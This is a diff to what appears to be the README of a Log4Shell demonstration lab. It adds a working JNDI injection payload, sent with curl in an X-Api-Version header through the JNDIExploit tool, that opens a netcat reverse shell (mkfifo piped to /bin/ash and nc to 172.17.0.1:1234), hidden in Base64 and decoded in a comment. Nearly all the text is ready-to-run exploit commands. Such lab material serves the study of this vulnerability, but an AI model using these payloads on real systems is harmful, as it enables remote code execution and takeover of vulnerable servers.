@@ -42,6 +42,14 @@ java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
 ```
 
+* Running a reverse shell on Alpine-Linux:
+
+```bash
+# will execute 'add netcat-openbsd && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/ash -i 2>&1|nc 172.17.0.1 1234 >/tmp/f'
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.29.129:1389/Basic/Command/Base64/YWRkIG5ldGNhdC1vcGVuYnNkICYmIHJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9hc2ggLWkgMj4mMXxuYyAxNzIuMTcuMC4xIDEyMzQgPi90bXAvZg==}'
+
+```
+
 * Notice the output of JNDIExploit, showing it has sent a malicious LDAP response and served the second-stage payload:
 
 ```
